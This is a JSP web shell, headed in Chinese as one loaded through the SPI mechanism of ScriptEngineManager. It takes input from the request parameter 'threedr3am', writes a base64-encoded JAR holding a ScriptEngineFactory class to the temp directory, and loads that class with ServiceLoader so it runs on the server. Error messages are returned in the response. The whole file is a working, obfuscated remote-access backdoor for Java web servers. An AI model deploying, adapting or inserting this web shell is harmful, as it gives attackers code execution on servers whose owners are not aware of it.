<%@ page import="java.net.URL" %>
<%@ page import="java.net.URLClassLoader" %>
<%@ page import="java.util.Random" %>
<%@ page import="java.io.File" %>
<%@ page import="java.nio.file.Files" %>
<%@ page import="java.nio.file.Paths" %>
<%@ page import="java.util.Base64" %>
<%@ page import="javax.script.ScriptEngineFactory" %>
<%@ page import="java.util.ServiceLoader" %>
<%@ page import="java.util.Iterator" %>
<html>
<body>
<h2>SPI机制的ScriptEngineManager自动加载实例化JSP Webshell</h2>
<%
    String tmp = System.getProperty("java.io.tmpdir");
    Random random = new Random();
    String jarPath = tmp + File.separator + "cve-" + random.nextInt(1000000) + ".jar";
    String inputFile = tmp + File.separator + "jabdhjabdjkandaldlanaklndkand.txt";
    String s = request.getParameter("threedr3am");
    if (Files.exists(Paths.get(inputFile)))
        Files.delete(Paths.get(inputFile));
    Files.write(Paths.get(inputFile), s.getBytes());

    if (Files.exists(Paths.get(jarPath)))
        Files.delete(Paths.get(jarPath));
    Files.write(Paths.get(jarPath), Base64.getDecoder().decode("UEsDBBQACAgIAEFZtFAAAAAAAAAAAAAAAAAJAAQATUVUQS1JTkYv/soAAAMAUEsHCAAAAAACAAAAAAAAAFBLAwQUAAgICABBWbRQAAAAAAAAAAAAAAAAFAAAAE1FVEEtSU5GL01BTklGRVNULk1G803My0xLLS7RDUstKs7Mz7NSMNQz4OVyLkpNLElN0XWqBAlY6BnEGxoZKmj4FyUm56QqOOcXFeQXJZYA1WvycvFyAQBQSwcIEBGmIkQAAABFAAAAUEsDBAoAAAgAAEdYtFAAAAAAAAAAAAAAAAASAAAATUVUQS1JTkYvc2VydmljZXMvUEsDBBQACAgIAHWms1AAAAAAAAAAAAAAAAAyAAAATUVUQS1JTkYvc2VydmljZXMvamF2YXguc2NyaXB0LlNjcmlwdEVuZ2luZUZhY3RvcnkLyShKTU0pMk7MDU4uyiwo4QIAUEsHCLDG5KcTAAAAEQAAAFBLAwQUAAgICAA9WbRQAAAAAAAAAAAAAAAAFgAAAFRocmVlZHIzYW1TY3JpcHQuY2xhc3ONVttzE1UY/22TdtOwpSWlLUEuBRVSoK2CgrYVJYUikFKkpbUUhW32NN1ks4mbDaTiDbl4v4uKV7ziXcZx2g4d9c0Hxxl98MknX/0fHPE7u5u0abaXmeTsnvN9v993Od93zv7637WfANyGq37chBMiZD/KcMKHYT+iUPiEVWIEMR9G+UT1Ie5HApqIpB86Un6k8ZAfEgwfMvxpcnHWj5M4JSInYsyPOjzsx3Kc5sMjPjwq4jEOe5wPT3DMGRFP8slZEef8aMR5PlwQ8ZSIp0U8I6CiQ9VVc6cAT6ipX4C3M6UwAdURVWcHs8lhZvTJwxqtBCKpqKz1y4bK586ix0ymuSgun5RbNVmPtfaahqrH2gVUqno6a3apXM2fypqFyRJLQHpMTgqos7FqqnXf9DLBlw5nR0aYwZTDTFaYIWBFQTFcJCFdr0bOChBYgc5ypW/USJ3ifnIVc1TNcE9pkTHF2CYne6OGmjZJVpWxfA5nVc2yFCwJxxFx3V5Tjia65bSVACuNMu2XiGetHTlHse7JRVnaVFM62auKMXOPHuO5lJPk3vJQk1uuagpq/czIENRB5kymZ2ymQB6ZNVWtNaJmuOeVvWpMl82sQdQbShQ6Sk3tJJBEzN1qkvWNpRkR+2jKnaPXanqNkHZWjjn+BmasFFzjBIdkgxRMnq4NoVI7M6PsGY6zKPfWk2BjAmq5eWaOppROWdN6x3RTzgk44EJSujI0v6VCPj2p4TjVA5WXVzZiFFmtC9KOrseqTNpVkyWZbi4cznSBm6ndaiatyRSUn6fESMUMXtIbQ4v105/J23Wyb9ekXQoCVjtbmmvNWOutM8Uc3pvKGlFmt1Xd7Mpu4VAJG7BRQMMcFU19xiUtaqqFOllRDRHPSXgeAxJewIsiXpLwMrYIWBeXh5VRPsQTsq7ImkJcckLTFT5tMXOmhFfQKaAxPpLgOoqe0GQlmdDjCX0kEddlUrT0RLwq4TW8TkU/2ycRFyW8gTdFvCXhEt7mvr9D29go4V28J+F9fCDisoQP8ZGAevfTgLrX5TyxZZzvYz58IuFT7qzgp2PFUtdJf4TSSH2jJ3qs7pXwGa5I+BxfSPgSX5Vo9qSZntf8Gt9QjbmcPBK+xUZu8juKd/YGFaXA7hKewLk2vEuOmiljLG+oOMLidI5lqKropLWrMs0Mk2AVcppcVgQ0L6rCp888KW/PLrTKDEtT95MvdHiYKVtbwLJpgsNZ3VT58cHbojCpKzr7nOX2fDiFvB6SzVHqBg9BBbS7uDp3cxVxlDJz94lZonwpuzQtPGby6YqQG7hpKCygPDQU5ndiOXW5avLGdjHterJ4WY5FBYQWOglod6Isk2kvSp+zSL1JOSja44Z8Ckuuy3wUswTc+9ppkXNj8lUfz0LEOmYqWI5uC7K31TUVQ5G5WqS96SihFabRRcCdc01kv33FONn2huzMnjJUjtnrbjE82+Z0s82119VpSq5p3c59hhy16s0l9/1Yhxvpc0zAzfRtVkVPOh/p4ysECH+hHD5a/XvTBIQplA1OwBMJeCdR3u3Mtoyj4nuINAZ8NIyj8mCpxG9L2gi4ZArSYLPnR0iTqJrE0glUB2rGsWwcgXHUtpVPYfngFOoGg+UTqJ9AQ1tFkKArBtvEXxDYHLTogjQMXLn+T9Dr8NBj5SRuuITqwtIkVhXeN5Ptcaym2ZpJrB24Al83ObduCo2DXDSB9T9T1BJ+w+/0JehBE0UcRg2NNfBiGUlqEaCvyS30bbkX9VDRgNMI4gJW4iJW0YG4Gj9gLeHXWwx/UEb/pJxuIoZjqCTsNWwmdBn9L6OZRg/xnEcLvXmJLYpW3EKZPo37cCu2ogJnsQ/bSCoSl5e+l28nLO0CtmMHPSVivwN3ks9tNNuO8usEFUW0i+gQcVf+t1PE3cC/CNJszXXytcxWgSDiHi92EdZLHI30D6OTRtpxskmXAD3LhKt8tHJRYa2ErHgkW+p4ImD3IpDNrsg96LKrbB7kVhfkXuv9XlrbtwiGHfMy7F8EQ8e8DAcWEf8u1/gji0B2uSK7cdBBbqdnmSvygIWst6UOkr/1WNbO4BDVms2xn55eV45DFscmWzqD47DFwd96rarmb304QlUtoB8DC/p2ZA7f7nd8G8TRBTmOzsExROw8m8fwwILZPe6a3Qet2fH/AVBLBwg24xLfXAYAAKwOAABQSwECFAAUAAgICABBWbRQAAAAAAIAAAAAAAAACQAEAAAAAAAAAAAAAAAAAAAATUVUQS1JTkYv/soAAFBLAQIUABQACAgIAEFZtFAQEaYiRAAAAEUAAAAUAAAAAAAAAAAAAAAAAD0AAABNRVRBLUlORi9NQU5JRkVTVC5NRlBLAQIKAAoAAAgAAEdYtFAAAAAAAAAAAAAAAAASAAAAAAAAAAAAAAAAAMMAAABNRVRBLUlORi9zZXJ2aWNlcy9QSwECFAAUAAgICAB1prNQsMbkpxMAAAARAAAAMgAAAAAAAAAAAAAAAADzAAAATUVUQS1JTkYvc2VydmljZXMvamF2YXguc2NyaXB0LlNjcmlwdEVuZ2luZUZhY3RvcnlQSwECFAAUAAgICAA9WbRQNuMS31wGAACsDgAAFgAAAAAAAAAAAAAAAABmAQAAVGhyZWVkcjNhbVNjcmlwdC5jbGFzc1BLBQYAAAAABQAFAGEBAAAGCAAAAAA="));
    try {
        Iterator<ScriptEngineFactory> iterator = ServiceLoader
                .load(ScriptEngineFactory.class, new URLClassLoader(new URL[]{new URL("file:" + jarPath)})).iterator();
        while (iterator.hasNext())
            iterator.next();
    } catch (Throwable e) {
        response.getOutputStream().write(e.getCause().getMessage().getBytes());
    }
%>
</body>
</html>